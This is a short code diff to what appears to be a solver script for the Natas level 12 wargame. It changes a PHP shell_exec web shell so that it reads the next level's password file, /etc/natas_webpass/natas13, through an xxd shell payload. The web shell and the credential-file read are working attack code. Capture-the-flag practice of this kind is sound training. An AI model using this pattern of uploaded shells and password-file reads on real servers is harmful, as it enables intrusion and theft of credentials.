@@ -4,8 +4,16 @@ import io
 
 natas = Natas('natas12')
 
+offset = b'0'
+length = b'0'
+filename = b'/etc/natas_webpass/natas13'
+
+payload = b'''
+echo $((0x$(xxd -p -s 0 -l 1 /etc/natas_webpass/natas13)))
+'''
+
 script = b'''
-    $output = shell_exec('ls -la 2>&1');
+    $output = shell_exec("'''+payload+b''' 2>&1");
     print $output;
 '''
 
